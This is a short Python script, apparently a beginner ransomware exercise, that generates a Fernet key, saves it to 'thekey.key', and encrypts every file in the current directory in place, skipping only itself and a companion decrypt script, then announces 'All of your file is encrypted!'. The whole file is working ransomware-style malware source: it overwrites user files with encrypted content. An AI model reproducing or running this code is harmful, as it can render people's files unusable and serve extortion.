from genericpath import isfile
import os
from cryptography.fernet import Fernet

files = [] 

for file in os.listdir(): # list every file in directory
    if file == "voldemort.py" or file == "thekey.key" or file == "decypt.py":
        continue
    if os.path.isfile(file):# also do not take folder in directory
        files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey: #make key to file.key
    thekey.write(key)

for file in files: # loop for every files
    with open(file, "rb") as thefile: # read contents of all files
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents) # put the key to be a key of all files
    with open(file, "wb") as thefile: # let's encypt!
        thefile.write(contents_encrypted)

print("All of your file is encrypted!")